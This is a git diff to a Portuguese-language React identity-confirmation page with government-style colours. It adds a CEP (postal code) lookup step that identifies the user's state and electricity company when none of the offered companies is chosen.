@@ -1,7 +1,8 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
-import { Form, FormControl, FormField, FormItem, FormMessage } from "@/components/ui/form";
+import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
+import { Input } from "@/components/ui/input";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { Label } from "@/components/ui/label";
@@ -550,6 +551,14 @@ export default function ConfirmarIdentidade() {
   // Lidar com o envio do formulário de companhia elétrica
   const onSubmitCompanhia = (values: CompanhiaFormValues) => {
     const companhiaEscolhida = values.companhia;
+    
+    // Verificar se o usuário selecionou "Nenhuma das opções"
+    if (companhiaEscolhida === "nenhuma_das_opcoes") {
+      // Avançar para etapa de CEP
+      setEtapaAtual(EtapaVerificacao.CEP_ALTERNATIVO);
+      return;
+    }
+    
     let companhiaValida = false;
     
     // Regras específicas para cada estado com base na documentação atualizada
@@ -637,6 +646,63 @@ export default function ConfirmarIdentidade() {
         description: "Por favor, selecione a companhia elétrica correta para o seu estado.",
         variant: "destructive",
       });
+    }
+  };
+  
+  // Lidar com o envio do formulário de CEP
+  const onSubmitCep = async (values: CepFormValues) => {
+    try {
+      setIsLoading(true);
+      
+      // Formatar o CEP para remover qualquer caractere não numérico
+      const cepFormatado = values.cep.replace(/\D/g, '');
+      
+      // Consultar a API de CEP
+      const response = await fetch(`/api/consulta-cep?cep=${cepFormatado}`);
+      
+      if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.message || "Erro ao consultar o CEP");
+      }
+      
+      const data = await response.json();
+      
+      if (!data.success) {
+        throw new Error(data.message || "CEP não encontrado");
+      }
+      
+      // Obter o estado do CEP e gerar as opções de companhia
+      const estadoDoCep = data.estado;
+      console.log(`Estado detectado pelo CEP: ${estadoDoCep}`);
+      
+      // Atualizar o estado selecionado
+      setEstado(estadoDoCep);
+      
+      // Verificar se temos opções de companhia para o estado
+      if (!opcoesCompanhiaPorEstado[estadoDoCep]) {
+        throw new Error(`Não foram encontradas companhias elétricas para o estado ${estadoDoCep}`);
+      }
+      
+      // Gerar as opções de companhia com base no estado do CEP
+      gerarOpcoesCompanhia(estadoDoCep);
+      
+      // Voltar para a etapa de seleção de companhia
+      setEtapaAtual(EtapaVerificacao.COMPANHIA_ELETRICA);
+      
+      toast({
+        title: "CEP localizado",
+        description: `Estado identificado: ${estadoDoCep}. Por favor, selecione sua companhia elétrica.`,
+      });
+      
+    } catch (error: any) {
+      console.error("Erro ao consultar CEP:", error);
+      toast({
+        title: "Erro ao consultar CEP",
+        description: error.message || "Não foi possível localizar o CEP informado. Verifique e tente novamente.",
+        variant: "destructive",
+      });
+    } finally {
+      setIsLoading(false);
     }
   };
 
@@ -806,6 +872,64 @@ export default function ConfirmarIdentidade() {
                               <ArrowRight className="ml-2 h-5 w-5" />
                             </Button>
                           </div>
+                        </form>
+                      </Form>
+                    </div>
+                  )}
+                  
+                  {etapaAtual === EtapaVerificacao.CEP_ALTERNATIVO && (
+                    <div>
+                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
+                        Por favor, informe seu CEP para que possamos localizar sua companhia elétrica:
+                      </h2>
+                      
+                      <Form {...cepForm}>
+                        <form onSubmit={cepForm.handleSubmit(onSubmitCep)} className="space-y-6">
+                          <FormField
+                            control={cepForm.control}
+                            name="cep"
+                            render={({ field }) => (
+                              <FormItem>
+                                <FormLabel>Digite seu CEP</FormLabel>
+                                <FormControl>
+                                  <Input
+                                    placeholder="12345-678"
+                                    {...field}
+                                    onChange={(e) => {
+                                      // Formatar o CEP enquanto digita
+                                      let value = e.target.value.replace(/\D/g, '');
+                                      if (value.length > 5) {
+                                        value = value.substring(0, 5) + '-' + value.substring(5, 8);
+                                      }
+                                      field.onChange(value);
+                                    }}
+                                    maxLength={9}
+                                  />
+                                </FormControl>
+                                <FormDescription>
+                                  Insira seu CEP para que possamos localizar sua companhia elétrica.
+                                </FormDescription>
+                                <FormMessage />
+                              </FormItem>
+                            )}
+                          />
+                          <Button 
+                            type="submit" 
+                            disabled={isLoading}
+                            className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
+                          >
+                            {isLoading ? (
+                              <>
+                                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                                Consultando...
+                              </>
+                            ) : (
+                              <>
+                                Consultar CEP
+                                <ArrowRight className="ml-2 h-4 w-4" />
+                              </>
+                            )}
+                          </Button>
                         </form>
                       </Form>
                     </div>
